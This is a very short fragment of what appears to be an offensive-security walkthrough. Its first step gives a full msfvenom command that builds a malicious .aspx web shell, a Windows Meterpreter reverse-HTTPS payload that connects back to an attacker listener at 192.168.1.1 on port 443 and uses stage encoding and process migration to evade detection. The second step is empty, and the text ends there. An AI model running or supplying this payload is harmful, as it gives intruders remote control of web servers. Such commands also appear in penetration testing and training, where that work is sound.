1. Create a malicious .aspx file with msfvenom

```
~# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=443 enablestageencoding=true handlersslcert=justice.pem prependmigrate=true -f aspx -o met.aspx
```

2. 
